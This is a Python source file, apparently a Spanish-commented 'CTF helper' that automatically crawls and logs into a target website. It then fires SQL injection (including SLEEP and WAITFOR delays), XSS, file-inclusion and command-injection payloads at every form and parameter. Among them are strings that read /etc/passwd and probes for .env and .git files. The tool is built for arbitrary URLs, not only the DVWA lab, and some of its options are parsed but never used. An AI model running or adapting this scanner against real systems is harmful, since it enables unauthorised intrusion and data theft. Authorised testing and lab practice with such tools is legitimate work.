#!/usr/bin/env python3
"""
Web CTF Helper - Reconocimiento y explotación web genérico.
Soporta: SQLi (error/time/boolean), XSS (reflected/stored), LFI, Command Injection.
Login automático genérico + modo DVWA opcional. Crawler básico integrado.

Uso típico:
    # Escaneo genérico (sin login)
    python3 web_helper.py --url https://target.com --json

    # Con login
    python3 web_helper.py --url https://target.com --login-user admin --login-pass pass

    # Modo DVWA (fuerza flujo conocido)
    python3 web_helper.py --url http://localhost --dvwa --security low

    # Con crawler (descubre endpoints)
    python3 web_helper.py --url https://target.com --crawl --depth 2
"""
import argparse
import json
import re
import sys
import time
from collections import deque
from urllib.parse import (
    urljoin, urlparse, parse_qs, urlencode, urlunparse, urldefrag,
)

import requests
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# ===================================================================== #
#  Firmas y patrones                                                    #
# ===================================================================== #

TECH_SIGNATURES = {
    "WordPress":  ["wp-content", "wp-includes", "/wp-json/"],
    "Drupal":     ["drupal.settings", "sites/default/files"],
    "Joomla":     ["/components/com_", "option=com_"],
    "jQuery":     ["jquery.min.js", "jquery.js", "jquery-"],
    "Bootstrap":  ["bootstrap.min.css", "bootstrap.min.js"],
    "React":      ["react.js", "react-dom", "__REACT_DEVTOOLS"],
    "Angular":    ["ng-app", "angular.min.js"],
    "Vue.js":     ["vue.js", "vue-router"],
    "Next.js":    ["__NEXT_DATA__", "_next/static"],
    "Nuxt":       ["__NUXT__", "_nuxt/"],
    "PHP":        [".php", "phpsessid", "x-powered-by: php"],
    "ASP.NET":    ["asp.net", "__viewstate"],
    "Django":     ["csrfmiddlewaretoken", "__admin__"],
    "Laravel":    ["laravel_session", "xsrf-token"],
    "Flask":      ["werkzeug", "session="],
    "Express":    ["x-powered-by: express"],
    "Nginx":      ["nginx"],
    "Apache":     ["apache"],
    "IIS":        ["microsoft-iis"],
    "Cloudflare": ["cloudflare", "__cfduid"],
}

SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning:\s*mysql_",
    r"valid mysql result",
    r"ora-\d{5}",
    r"oracle error",
    r"postgresql.*error",
    r"pg_query\(\)",
    r"sqlite\.exception",
    r"microsoft ole db provider for sql server",
    r"unclosed quotation mark after the character string",
    r"com\.mysql\.jdbc",
    r"java\.sql\.sqlexception",
    r"supplied argument is not a valid mysql",
    r"quoted string not properly terminated",
]

SEVERITY_MAP = {
    "SQL Injection (error-based)":         ("critical", 9.8),
    "SQL Injection (time-based/mysql)":    ("high", 8.1),
    "SQL Injection (time-based/postgres)": ("high", 8.1),
    "SQL Injection (time-based/mssql)":    ("high", 8.1),
    "SQL Injection (boolean-based)":       ("high", 8.1),
    "XSS (reflected)":                     ("medium", 6.1),
    "XSS (stored)":                        ("high", 7.5),
    "Local File Inclusion":                ("high", 7.5),
    "Command Injection":                   ("critical", 9.8),
    "Open Redirect":                       ("medium", 6.1),
}

SQL_TIME_PAYLOADS = [
    ("' AND SLEEP({d})#",               "mysql"),
    ("1' AND SLEEP({d})#",              "mysql"),
    ("1 AND SLEEP({d})",                "mysql"),
    ("' AND SLEEP({d})-- -",            "mysql"),
    ("' AND SLEEP({d})-- ",             "mysql"),
    ("' AND 1=(SELECT SLEEP({d}))#",    "mysql"),
    ("'; SELECT pg_sleep({d}) -- ",     "postgres"),
    ("'; WAITFOR DELAY '0:0:{d}' -- ",  "mssql"),
]

CMDI_PAYLOADS = [
    ("; id",              r"uid=\d+"),
    ("| id",              r"uid=\d+"),
    ("$(id)",             r"uid=\d+"),
    ("`id`",              r"uid=\d+"),
    ("; cat /etc/passwd", r"root:x:0:0:"),
    ("| whoami",          r"\b(root|www-data|apache|nobody|daemon)\b"),
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
]
LFI_PATTERN = r"root:x:0:0:"
LFI_BASE64_PATTERN = r"[A-Za-z0-9+/=]{100,}"

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "\"><script>alert(1)</script>",
]

SQL_BOOLEAN_PAIRS = [
    ("' AND '1'='1' -- ", "' AND '1'='2' -- "),
    ("1 AND 1=1",          "1 AND 1=2"),
    ("1' AND '1'='1",      "1' AND '1'='2"),
]

SQL_BOOLEAN_MARKERS = [
    (["user id exists", "user exists"], ["user id is missing", "user does not exist"]),
    (["welcome back", "logged in"],     ["invalid", "not authorized"]),
    (["found rows", "record found"],    ["no records", "not found"]),
]

# Endpoints comunes para probar a ciegas (útil contra targets sin crawl)
COMMON_PATHS = [
    "/admin", "/admin/", "/login", "/login.php",
    "/backup", "/backup.zip", "/backup.tar.gz",
    "/.git/HEAD", "/.env", "/config.php",
    "/api", "/api/v1", "/api/v2",
    "/robots.txt", "/sitemap.xml",
    "/wp-admin", "/wp-login.php",
    "/phpinfo.php", "/info.php", "/test.php",
    "/upload", "/uploads/", "/files/",
]


# ===================================================================== #
#  Clase principal                                                      #
# ===================================================================== #
class WebRecon:
    def __init__(self, url, security="low", skip=None, debug_html=False,
                 user_agent=None, delay=0.0):
        self.url = url
        self.security = security
        self.skip = skip or []
        self.debug_html = debug_html
        self.delay = delay
        self._last_html = ""
        self._virtual_form_ids = set()
        self._visited_urls = set()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'Mozilla/5.0 (CTF-Team-Helper)'
        })
        self.results = {
            "target": url,
            "security_level": security,
            "headers": {},
            "technologies": [],
            "forms": [],
            "vulnerabilities": [],
            "discovered_urls": [],
        }

    # ------------------------------------------------------------------ #
    #  Login genérico (detecta formulario con input[type=password])      #
    # ------------------------------------------------------------------ #
    def login(self, user=None, password=None):
        """
        Login genérico: busca en la home un form con input[type=password],
        lo rellena y envía. Devuelve True si parece exitoso.
        """
        if not user or not password:
            self._debug("Login: sin credenciales, saltando")
            return False

        # 1) Buscar formulario de login en la URL actual
        try:
            r = self.session.get(self.url, verify=False, timeout=10)
        except requests.RequestException as e:
            print(f"[-] Error obteniendo home para login: {e}")
            return False

        soup = BeautifulSoup(r.text, "html.parser")
        login_form = None
        for form in soup.find_all("form"):
            if form.find("input", {"type": "password"}):
                login_form = form
                break

        if not login_form:
            self._debug("Login: no se encontró form con input[type=password]")
            return False

        action = login_form.get("action", "") or ""
        method = (login_form.get("method") or "POST").upper()
        target = urljoin(self.url, action) if action else self.url

        # 2) Construir payload
        data = {}
        user_field = None
        pass_field = None
        for inp in login_form.find_all("input"):
            name = inp.get("name")
            if not name:
                continue
            itype = (inp.get("type") or "text").lower()
            if itype == "password":
                pass_field = name
            elif itype in ("text", "email") and user_field is None:
                user_field = name
            elif itype == "hidden":
                data[name] = inp.get("value", "") or ""
            elif itype == "submit":
                data[name] = inp.get("value") or "Login"

        if not user_field or not pass_field:
            self._debug(f"Login: campos ambiguos (user={user_field}, pass={pass_field})")
            return False

        data[user_field] = user
        data[pass_field] = password

        # 3) Enviar
        try:
            if method == "POST":
                r2 = self.session.post(target, data=data, verify=False,
                                       timeout=10, allow_redirects=True)
            else:
                r2 = self.session.get(target, params=data, verify=False,
                                      timeout=10, allow_redirects=True)
        except requests.RequestException as e:
            print(f"[-] Error enviando login: {e}")
            return False

        # 4) Heurística de éxito: no estamos en /login y no hay password field
        soup2 = BeautifulSoup(r2.text, "html.parser")
        still_login = bool(soup2.find("input", {"type": "password"}))
        if still_login:
            print("[-] Login fallido (sigue apareciendo input[type=password])")
            return False

        print(f"[+] Login OK como '{user}' (campos: {user_field}/{pass_field})")
        return True

    # ------------------------------------------------------------------ #
    #  Modo DVWA (opcional, fuerza flujo conocido)                       #
    # ------------------------------------------------------------------ #
    def login_dvwa(self, user="admin", password="password"):
        login_url = urljoin(self.url, "/login.php")

        r = self.session.get(login_url, verify=False, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        tok = soup.find("input", {"name": "user_token"})
        token = tok["value"] if tok else None

        data = {"username": user, "password": password, "Login": "Login"}
        if token:
            data["user_token"] = token

        r = self.session.post(login_url, data=data, verify=False, timeout=10)
        if "login.php" in r.url:
            print("[-] Login DVWA fallido.")
            return False
        print(f"[+] Login DVWA OK como '{user}'")

        sec_url = urljoin(self.url, "/security.php")
        r = self.session.get(sec_url, verify=False, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        tok = soup.find("input", {"name": "user_token"})
        token = tok["value"] if tok else None

        data = {"security": self.security, "seclev_submit": "Submit"}
        if token:
            data["user_token"] = token
        self.session.post(sec_url, data=data, verify=False, timeout=10)
        print(f"[+] Security level forzado a '{self.security}'")
        return True

    # ------------------------------------------------------------------ #
    #  Crawler básico                                                    #
    # ------------------------------------------------------------------ #
    def crawl(self, depth=2, max_urls=100):
        """
        Crawler BFS: descubre URLs internas hasta `depth` niveles.
        Devuelve la lista de URLs con parámetros (candidatas a inyección).
        """
        print(f"[*] Iniciando crawler (depth={depth}, max={max_urls})...")

        start = self.url
        domain = urlparse(start).netloc
        queue = deque([(start, 0)])
        seen = set([start])
        discovered = []

        while queue and len(discovered) < max_urls:
            current, level = queue.popleft()
            if level >= depth:
                continue

            try:
                r = self.session.get(current, verify=False, timeout=10)
            except requests.RequestException:
                continue

            if "text/html" not in r.headers.get("Content-Type", ""):
                continue

            soup = BeautifulSoup(r.text, "html.parser")

            for a in soup.find_all("a", href=True):
                href = a["href"].strip()
                if not href or href.startswith(("mailto:", "javascript:", "tel:")):
                    continue
                absolute = urljoin(current, href)
                absolute, _ = urldefrag(absolute)
                parsed = urlparse(absolute)

                if parsed.netloc != domain:
                    continue
                if absolute in seen:
                    continue

                seen.add(absolute)

                # URLs con query string → candidatas directas a inyección
                if parsed.query:
                    discovered.append(absolute)

                queue.append((absolute, level + 1))

            # También extraemos <form action>
            for form in soup.find_all("form"):
                action = form.get("action", "")
                if not action:
                    continue
                absolute = urljoin(current, action)
                if absolute not in seen:
                    seen.add(absolute)
                    if urlparse(absolute).query:
                        discovered.append(absolute)

        self.results["discovered_urls"] = list(dict.fromkeys(discovered))
        print(f"[+] Crawler: {len(seen)} URLs vistas, "
              f"{len(self.results['discovered_urls'])} con parámetros")
        return self.results["discovered_urls"]

    # ------------------------------------------------------------------ #
    #  Extracción de forms                                               #
    # ------------------------------------------------------------------ #
    def extract_forms(self, html):
        soup = BeautifulSoup(html, 'html.parser')
        for form in soup.find_all('form'):
            form_data = {
                "action": form.get('action', '') or '',
                "method": (form.get('method') or 'GET').upper(),
                "inputs": []
            }
            for tag in form.find_all(['input', 'textarea', 'select']):
                name = tag.get('name')
                if not name:
                    continue
                form_data["inputs"].append({
                    "name": name,
                    "type": tag.get('type', 'text'),
                    "value": tag.get('value', '')
                })
            self.results["forms"].append(form_data)
            self._debug(f"Formulario detectado: {form_data['method']} {form_data['action']!r}")

        if self.results["forms"]:
            return

        # DVWA high fallback (solo si --dvwa)
        parsed = urlparse(self.url)
        module = parsed.path.rstrip("/").rsplit("/", 1)[-1]
        high_sql_inputs = {"sqli": "session-input.php", "sqli_blind": "cookie-input.php"}
        if self.security == "high" and module in high_sql_inputs:
            params = parse_qs(parsed.query, keep_blank_values=True)
            self.results["forms"].append({
                "action": urljoin(self.url, high_sql_inputs[module]),
                "method": "POST",
                "inputs": [
                    {"name": "id", "type": "text",
                     "value": params.get("id", [""])[0]},
                    {"name": "Submit", "type": "submit", "value": "Submit"},
                ],
            })
            self._debug(f"Formulario virtual high para DVWA")
            return

        if parsed.query:
            form_data = {
                "action": parsed.path or "/",
                "method": "GET",
                "inputs": [
                    {"name": key, "type": "text", "value": values[0]}
                    for key, values in parse_qs(
                        parsed.query, keep_blank_values=True
                    ).items()
                ],
            }
            self.results["forms"].append(form_data)
            self._virtual_form_ids.add(id(form_data))
            self._debug(f"Formulario virtual GET desde query")

    def _debug(self, message):
        if self.debug_html:
            print(f"[debug] {message}")

    def _debug_html(self, context, html):
        if self.debug_html:
            print(f"[debug] HTML de {context} (primeros 5000 caracteres):")
            print(html[:5000])

    # ------------------------------------------------------------------ #
    #  CSRF refresh                                                      #
    # ------------------------------------------------------------------ #
    def _refresh_form(self, target_form):
        is_virtual = id(target_form) in self._virtual_form_ids
        if (not is_virtual and
                not any(i["type"] == "hidden" for i in target_form["inputs"])):
            return None

        try:
            r = self.session.get(self.url, verify=False, timeout=10)
        except requests.RequestException as e:
            print(f"[-] Error refrescando CSRF: {e}")
            return None

        soup = BeautifulSoup(r.text, 'html.parser')
        hidden_inputs = []
        for tag in soup.find_all('input'):
            name = tag.get('name')
            if name and ((tag.get('type') or '').lower() == 'hidden'
                         or name == 'user_token'):
                hidden_inputs.append({
                    "name": name, "type": "hidden",
                    "value": tag.get('value', ''),
                })

        for f in soup.find_all('form'):
            if (f.get('action', '') or '') == target_form['action']:
                fresh = {
                    "action": target_form['action'],
                    "method": (f.get('method') or 'GET').upper(),
                    "inputs": [],
                }
                for tag in f.find_all(['input', 'textarea', 'select']):
                    name = tag.get('name')
                    if not name:
                        continue
                    fresh["inputs"].append({
                        "name": name,
                        "type": tag.get('type', 'text'),
                        "value": tag.get('value', '')
                    })
                if is_virtual:
                    fresh_names = {inp["name"] for inp in fresh["inputs"]}
                    fresh["inputs"].extend(
                        inp for inp in target_form["inputs"]
                        if inp["name"] not in fresh_names
                    )
                    for hidden in hidden_inputs:
                        for index, inp in enumerate(fresh["inputs"]):
                            if inp["name"] == hidden["name"]:
                                fresh["inputs"][index] = hidden
                                break
                        else:
                            fresh["inputs"].append(hidden)
                return fresh

        if is_virtual and hidden_inputs:
            return {
                **target_form,
                "inputs": [inp for inp in target_form["inputs"]
                           if inp["type"] != "hidden"] + hidden_inputs,
            }
        return None

    def _prepare(self, form, field_name, payload):
        fresh = self._refresh_form(form) or form
        data = {}
        for inp in fresh["inputs"]:
            name = inp["name"]
            if name == field_name:
                data[name] = (inp.get("value") or "") + payload
            elif inp["type"] == "submit":
                data[name] = inp.get("value") or "Submit"
            elif inp["type"] == "hidden":
                data[name] = inp.get("value") or ""
            else:
                data[name] = inp.get("value") or "test"
        return fresh, data

    def _submit_form(self, form, data):
        action = (form.get("action") or "").strip()
        if action in ("", "#"):
            parsed = urlparse(self.url)
            target = urlunparse(parsed._replace(query="", fragment=""))
        else:
            target = urljoin(self.url, action)
        if self.delay:
            time.sleep(self.delay)
        if form["method"] == "POST":
            return self.session.post(target, data=data, verify=False, timeout=15)
        return self.session.get(target, params=data, verify=False, timeout=15)

    def _submit_form_payload(self, form, field_name, payload, method):
        fresh, data = self._prepare(form, field_name, payload)
        attempt_form = {**fresh, "method": method}
        response = self._submit_form(attempt_form, data)
        # DVWA high popup (solo aplica si estamos contra DVWA)
        if (self.security == "high"
                and urlparse(form["action"]).path.rsplit("/", 1)[-1]
                in {"session-input.php", "cookie-input.php"}):
            response = self.session.get(self.url, verify=False, timeout=15)
        return response

    @staticmethod
    def _form_methods(form):
        declared = form["method"].upper()
        if urlparse(form["action"]).path.rsplit("/", 1)[-1] in {
            "session-input.php", "cookie-input.php"
        }:
            return (declared,)
        alternate = "POST" if declared == "GET" else "GET"
        return declared, alternate

    @staticmethod
    def _dedupe(vulns, new, keys):
        enriched = dict(new)
        enriched["severity"], enriched["cvss"] = SEVERITY_MAP.get(
            enriched["type"], ("medium", 5.0)
        )
        for v in vulns:
            if all(v.get(k) == enriched.get(k) for k in keys):
                return
        vulns.append(enriched)

    # ------------------------------------------------------------------ #
    #  Reconocimiento                                                    #
    # ------------------------------------------------------------------ #
    def get_headers(self):
        try:
            response = self.session.get(self.url, verify=False, timeout=10)
        except Exception as e:
            print(f"[-] Error conectando a {self.url}: {e}")
            sys.exit(1)

        self.results["headers"] = dict(response.headers)

        for h in ("Server", "X-Powered-By", "X-Generator", "X-AspNet-Version"):
            val = response.headers.get(h)
            if val:
                self._add_tech(f"{h}: {val}")

        html = response.text
        self._last_html = html
        low = html.lower()
        for tech, kws in TECH_SIGNATURES.items():
            for kw in kws:
                if kw.lower() in low:
                    self._add_tech(tech)
                    break
        return html

    def _add_tech(self, tech):
        if tech and tech not in self.results["technologies"]:
            self.results["technologies"].append(tech)

    # ------------------------------------------------------------------ #
    #  SQLi error-based                                                  #
    # ------------------------------------------------------------------ #
    def test_sqli_error(self):
        print("[*] Probando SQLi error-based...")
        payloads = ["'", "\"", "' OR '1'='1' -- ", "\" OR \"1\"=\"1\" -- "]

        for form in self.results["forms"]:
            inputs = [i for i in form["inputs"]
                      if i["name"] and i["type"] != "submit"]
            if not inputs:
                continue

            for method in self._form_methods(form):
                found = False
                for field in inputs:
                    for payload in payloads:
                        try:
                            resp = self._submit_form_payload(
                                form, field["name"], payload, method
                            )
                        except Exception as e:
                            print(f"[-] Error: {e}")
                            continue

                        pattern = next(
                            (p for p in SQL_ERROR_PATTERNS
                             if re.search(p, resp.text, re.IGNORECASE)),
                            None,
                        )
                        if pattern:
                            print(f"[!] SQLi (error) en '{field['name']}' con {payload!r}")
                            self._dedupe(
                                self.results["vulnerabilities"],
                                {
                                    "type": "SQL Injection (error-based)",
                                    "form_action": form["action"],
                                    "method": method,
                                    "field": field["name"],
                                    "payload": payload,
                                    "evidence": pattern,
                                },
                                ("type", "form_action", "field"),
                            )
                            found = True
                            break
                    if found:
                        break
                if found:
                    break

    # ------------------------------------------------------------------ #
    #  SQLi time-based                                                   #
    # ------------------------------------------------------------------ #
    def test_sqli_time(self, delay=4, threshold=3.5):
        print(f"[*] Probando SQLi time-based (SLEEP {delay}s)...")

        for form in self.results["forms"]:
            inputs = [i for i in form["inputs"]
                      if i["name"] and i["type"] != "submit"]
            if not inputs:
                continue

            found = False
            for method in self._form_methods(form):
                for field in inputs:
                    try:
                        base_start = time.time()
                        self._submit_form_payload(form, field["name"], "1", method)
                        baseline = time.time() - base_start
                    except Exception:
                        continue

                    attempts = 0
                    deltas = []
                    for tmpl, engine in SQL_TIME_PAYLOADS:
                        payload = tmpl.format(d=delay)
                        started = time.time()
                        attempts += 1
                        try:
                            self._submit_form_payload(
                                form, field["name"], payload, method
                            )
                        except Exception:
                            deltas.append(0.0)
                            continue
                        elapsed = time.time() - started
                        deltas.append(round(elapsed - baseline, 2))

                        if elapsed - baseline >= threshold:
                            print(f"[!] SQLi (time-based/{engine}) en '{field['name']}' "
                                  f"→ {elapsed:.2f}s")
                            self._dedupe(
                                self.results["vulnerabilities"],
                                {
                                    "type": f"SQL Injection (time-based/{engine})",
                                    "form_action": form["action"],
                                    "method": method,
                                    "field": field["name"],
                                    "payload": payload,
                                    "attempts": attempts,
                                    "deltas": deltas,
                                    "elapsed_seconds": round(elapsed, 2),
                                    "baseline_seconds": round(baseline, 2),
                                },
                                ("type", "form_action", "field"),
                            )
                            found = True
                            break
                    if found:
                        break
                if found:
                    break

    # ------------------------------------------------------------------ #
    #  SQLi boolean-based                                                #
    # ------------------------------------------------------------------ #
    def test_sqli_boolean(self):
        print("[*] Probando SQLi boolean-based...")

        for form in self.results["forms"]:
            inputs = [i for i in form["inputs"]
                      if i["name"] and i["type"] != "submit"]
            if not inputs:
                continue
            found = False
            for method in self._form_methods(form):
                for field in inputs:
                    for payload_true, payload_false in SQL_BOOLEAN_PAIRS:
                        fresh_t, data_t = self._prepare(form, field["name"], payload_true)
                        fresh_f, data_f = self._prepare(form, field["name"], payload_false)
                        try:
                            resp_t = self._submit_form(fresh_t, data_t)
                            resp_f = self._submit_form(fresh_f, data_f)
                        except Exception:
                            continue

                        len_t, len_f = len(resp_t.text), len(resp_f.text)
                        denom = max(len_t, len_f, 1)
                        ratio = abs(len_t - len_f) / denom

                        text_t = resp_t.text.lower()
                        text_f = resp_f.text.lower()

                        evidence = None
                        for t_markers, f_markers in SQL_BOOLEAN_MARKERS:
                            hit_true = next(
                                (m for m in t_markers
                                 if m in text_t and m not in text_f), None
                            )
                            hit_false = next(
                                (m for m in f_markers
                                 if m in text_f and m not in text_t), None
                            )
                            if hit_true and hit_false:
                                evidence = f"markers: {hit_true!r} vs {hit_false!r}"
                                break

                        if not evidence and ratio > 0.30:
                            evidence = (f"len diff: {len_t} vs {len_f} "
                                        f"(ratio {ratio:.2f})")

                        if evidence:
                            print(f"[!] SQLi boolean-based en '{field['name']}'")
                            self._dedupe(
                                self.results["vulnerabilities"],
                                {
                                    "type": "SQL Injection (boolean-based)",
                                    "form_action": form["action"],
                                    "method": method,
                                    "field": field["name"],
                                    "payload": payload_true,
                                    "evidence": evidence,
                                },
                                ("type", "form_action", "field"),
                            )
                            found = True
                            break
                    if found:
                        break
                if found:
                    break

    # ------------------------------------------------------------------ #
    #  XSS                                                               #
    # ------------------------------------------------------------------ #
    def test_xss(self):
        vuln_type = "XSS (stored)" if "/xss_s" in self.url else "XSS (reflected)"
        print(f"[*] Probando {vuln_type}...")
        encoded_marker = "&lt;script&gt;"

        parsed = urlparse(self.url)
        if parsed.query:
            params = parse_qs(parsed.query, keep_blank_values=True)
            for param in params:
                for payload in XSS_PAYLOADS:
                    tp = {k: v[0] for k, v in params.items()}
                    tp[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                    try:
                        resp = self.session.get(test_url, verify=False, timeout=10)
                    except Exception:
                        continue
                    if payload in resp.text and encoded_marker not in resp.text:
                        print(f"[!] {vuln_type} en URL param '{param}'")
                        self._dedupe(
                            self.results["vulnerabilities"],
                            {"type": vuln_type, "location": "URL parameter",
                             "method": "GET", "field": param, "payload": payload},
                            ("type", "location", "field"),
                        )
                        break

        for form in self.results["forms"]:
            inputs = [i for i in form["inputs"]
                      if i["name"] and i["type"] != "submit"]
            if not inputs:
                continue
            found = False
            for method in self._form_methods(form):
                for field in inputs:
                    for payload in XSS_PAYLOADS:
                        try:
                            resp = self._submit_form_payload(
                                form, field["name"], payload, method
                            )
                        except Exception:
                            continue
                        if payload in resp.text and encoded_marker not in resp.text:
                            print(f"[!] {vuln_type} en form '{field['name']}'")
                            self._dedupe(
                                self.results["vulnerabilities"],
                                {"type": vuln_type, "location": "form input",
                                 "form_action": form["action"], "method": method,
                                 "field": field["name"], "payload": payload},
                                ("type", "location", "form_action", "field"),
                            )
                            found = True
                            break
                    if found:
                        break
                if found:
                    break

    # ------------------------------------------------------------------ #
    #  LFI                                                               #
    # ------------------------------------------------------------------ #
    def test_lfi(self):
        print("[*] Probando Local File Inclusion...")

        def _is_lfi_hit(body, payload):
            if re.search(LFI_PATTERN, body):
                return "/etc/passwd legible"
            if "php://filter" in payload and re.search(LFI_BASE64_PATTERN, body):
                return "php://filter devuelve base64"
            return None

        for form in self.results["forms"]:
            inputs = [i for i in form["inputs"]
                      if i["name"] and i["type"] != "submit"]
            if not inputs:
                continue
            found = False
            for method in self._form_methods(form):
                for field in inputs:
                    for payload in LFI_PAYLOADS:
                        try:
                            resp = self._submit_form_payload(
                                form, field["name"], payload, method
                            )
                        except Exception:
                            continue
                        evidence = _is_lfi_hit(resp.text, payload)
                        if evidence:
                            print(f"[!] LFI en '{field['name']}'")
                            self._dedupe(
                                self.results["vulnerabilities"],
                                {
                                    "type": "Local File Inclusion",
                                    "form_action": form["action"],
                                    "method": method,
                                    "field": field["name"],
                                    "payload": payload,
                                    "evidence": evidence,
                                },
                                ("type", "form_action", "field"),
                            )
                            found = True
                            break
                    if found:
                        break
                if found:
                    break

        parsed = urlparse(self.url)
        if parsed.query:
            params = parse_qs(parsed.query, keep_blank_values=True)
            for param in params:
                for payload in LFI_PAYLOADS:
                    tp = {k: v[0] for k, v in params.items()}
                    tp[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                    try:
                        resp = self.session.get(test_url, verify=False, timeout=10)
                    except Exception:
                        continue
                    evidence = _is_lfi_hit(resp.text, payload)
                    if evidence:
                        print(f"[!] LFI en URL param '{param}'")
                        self._dedupe(
                            self.results["vulnerabilities"],
                            {"type": "Local File Inclusion",
                             "location": "URL parameter",
                             "method": "GET", "field": param, "payload": payload,
                             "evidence": evidence},
                            ("type", "location", "field"),
                        )
                        break

    # ------------------------------------------------------------------ #
    #  Command Injection                                                 #
    # ------------------------------------------------------------------ #
    def test_cmdi(self):
        print("[*] Probando Command Injection...")

        for form in self.results["forms"]:
            inputs = [i for i in form["inputs"]
                      if i["name"] and i["type"] != "submit"]
            if not inputs:
                continue
            found = False
            for method in self._form_methods(form):
                for field in inputs:
                    for payload, pattern in CMDI_PAYLOADS:
                        try:
                            resp = self._submit_form_payload(
                                form, field["name"], payload, method
                            )
                        except Exception:
                            continue
                        m = re.search(pattern, resp.text)
                        if m:
                            print(f"[!] Command Injection en '{field['name']}'")
                            self._dedupe(
                                self.results["vulnerabilities"],
                                {
                                    "type": "Command Injection",
                                    "form_action": form["action"],
                                    "method": method,
                                    "field": field["name"],
                                    "payload": payload,
                                    "evidence": m.group(0),
                                },
                                ("type", "form_action", "field"),
                            )
                            found = True
                            break
                    if found:
                        break
                if found:
                    break

    # ------------------------------------------------------------------ #
    #  Orquestación                                                      #
    # ------------------------------------------------------------------ #
    def scan_one(self, url):
        """Escanea una URL concreta. Devuelve el nº de vulns nuevas."""
        self.url = url
        self.results["forms"] = []
        before = len(self.results["vulnerabilities"])

        try:
            html = self.get_headers()
        except SystemExit:
            return 0

        self.extract_forms(html)

        if self.results["forms"]:
            if "sqli-error" not in self.skip:
                self.test_sqli_error()
            if "sqli-time" not in self.skip:
                self.test_sqli_time()
            if "sqli-boolean" not in self.skip:
                self.test_sqli_boolean()
            if "cmdi" not in self.skip:
                self.test_cmdi()
        if "lfi" not in self.skip:
            self.test_lfi()
        if "xss" not in self.skip:
            self.test_xss()

        return len(self.results["vulnerabilities"]) - before

    def run(self):
        print(f"[*] Iniciando reconocimiento en: {self.url}")
        if self.discovered_urls_hint:
            print(f"[*] Crawler descubrió {len(self.discovered_urls_hint)} URLs con parámetros")
            for u in self.discovered_urls_hint:
                print(f"    - {u}")
                self.scan_one(u)
        else:
            self.scan_one(self.url)

        total = len(self.results["vulnerabilities"])
        print(f"[+] Reconocimiento completado. Vulnerabilidades: {total}")
        return self.results

    # Atributo que el CLI rellenará antes de llamar a run()
    discovered_urls_hint = None


# ===================================================================== #
#  CLI                                                                  #
# ===================================================================== #
def main():
    parser = argparse.ArgumentParser(
        description="Web CTF Helper - Escáner genérico de vulnerabilidades web",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  Escaneo básico:
    %(prog)s --url https://target.com

  Con login:
    %(prog)s --url https://target.com --login-user admin --login-pass secret

  Modo DVWA:
    %(prog)s --url http://localhost --dvwa --security low

  Con crawler:
    %(prog)s --url https://target.com --crawl --depth 2
        """,
    )
    parser.add_argument("--url", required=True, help="URL objetivo")
    parser.add_argument("--json", action="store_true", help="Exportar JSON a stdout")
    parser.add_argument("--output", help="Archivo JSON de salida")
    parser.add_argument("--no-color", action="store_true",
                        help="Desactivar colores en la salida")
    parser.add_argument("--user-agent", help="User-Agent personalizado")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="Delay entre requests (segundos)")

    # Login
    parser.add_argument("--login-user", help="Usuario para login genérico")
    parser.add_argument("--login-pass", help="Password para login genérico")
    parser.add_argument("--cookie", help="Cookie manual (ej: 'PHPSESSID=xxx')")
    parser.add_argument("--no-login", action="store_true",
                        help="No intentar login")

    # Modo DVWA
    parser.add_argument("--dvwa", action="store_true",
                        help="Modo DVWA (fuerza login + security level)")
    parser.add_argument("--security", default="low",
                        choices=["low", "medium", "high", "impossible"],
                        help="Nivel DVWA a forzar (solo con --dvwa)")

    # Crawler
    parser.add_argument("--crawl", action="store_true",
                        help="Activar crawler para descubrir endpoints")
    parser.add_argument("--depth", type=int, default=2,
                        help="Profundidad del crawler (default: 2)")

    # Filtros
    parser.add_argument("--skip", nargs="+", default=[],
                        choices=["sqli-error", "sqli-time", "sqli-boolean",
                                 "xss", "lfi", "cmdi"],
                        help="Pruebas a omitir")
    parser.add_argument("--debug-html", action="store_true",
                        help="Imprimir HTML y trazas de diagnóstico")
    parser.add_argument("--sleep", type=int, default=4,
                        help="Segundos de SLEEP para time-based (default: 4)")

    args = parser.parse_args()

    scanner = WebRecon(
        args.url,
        security=args.security,
        skip=args.skip,
        debug_html=args.debug_html,
        user_agent=args.user_agent,
        delay=args.delay,
    )

    if args.cookie:
        scanner.session.headers.update({"Cookie": args.cookie})

    # Login
    if not args.no_login and not args.cookie:
        if args.dvwa:
            scanner.login_dvwa(user=args.login_user or "admin",
                               password=args.login_pass or "password")
        elif args.login_user and args.login_pass:
            scanner.login(args.login_user, args.login_pass)
        else:
            print("[*] Sin credenciales, escaneo anónimo")

    # Crawler
    if args.crawl:
        discovered = scanner.crawl(depth=args.depth)
        scanner.discovered_urls_hint = discovered

    # Ajustar sleep para time-based
    if "sqli-time" not in args.skip:
        original_time = scanner.test_sqli_time
        def patched(delay=args.sleep, threshold=None):
            if threshold is None:
                threshold = args.sleep - 0.5
            return original_time(delay=delay, threshold=threshold)
        scanner.test_sqli_time = patched

    # Importar reporter (opcional, para que no falle si no está)
    try:
        from reporter import TerminalReporter
        _HAS_REPORTER = True
    except ImportError:
        _HAS_REPORTER = False

    start_time = time.time()
    results = scanner.run()
    elapsed = time.time() - start_time

    # Guardar JSON si se pidió
    if args.output:
        output_data = json.dumps(results, indent=4)
        with open(args.output, 'w') as f:
            f.write(output_data)

